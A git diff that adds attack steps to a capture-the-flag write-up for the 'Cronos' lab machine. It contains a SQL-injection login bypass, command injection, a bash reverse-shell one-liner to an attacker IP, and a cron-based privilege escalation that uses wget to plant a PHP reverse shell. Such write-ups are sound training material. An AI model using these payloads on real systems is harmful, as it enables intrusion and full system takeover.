@@ -60,9 +60,42 @@ gobuster dns -d cronos.htb -w /usr/share/wordlists/seclists/Discovery/DNS/nameli
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/443694fe-6171-479f-8ff4-92d5bc986ca1)
 
 + Navigate to `http://admin.cronos.htb/`
++ Login bypass injecting `admin' or '`:`pass`
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9bcf5f5e-d294-4d8c-94c1-e7b104bbd065)
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4e8644a6-27b4-4344-89e3-1212103589d8)
 
++ Use `;` to inject command, and that works.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5933aa22-258b-4e2a-a2ec-dd75145e7892)
+
++ Start a netcat listener: `nc -lnvp 4444`
++ Inject reverse payload after `;`  `/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"` and execute
++ Get shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/765ae797-f4f3-4efc-8602-2587e6aeba6a)
+
++ Check cronjobs: `cat /etc/crontab` on the target.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2f5fd4a0-4895-4cbb-bc40-6ef8ece43146)
+
++ `cp /usr/share/webshells/php/php-reverse-shell.php shell.php` on your attack machine.
++ Change ip address and port number.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b08c2273-d780-4622-9ed4-f50cd8f50d9b)
+
++ Start `python3 -m http.server` on the attack machine.
+
++ Transfer to the target.
++ `cd /var/www/laravel/` on the target.
++ `wget 10.10.14.18:8000/shell.php -O artisan`
++ `chmod +x artisan`
+
++ Start listener: `nc -lnvp 5555`
++ Get root shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bca0fd82-2a1b-4293-bbe0-8f697cba3cdd)
 
 
 # References & Alternatives:
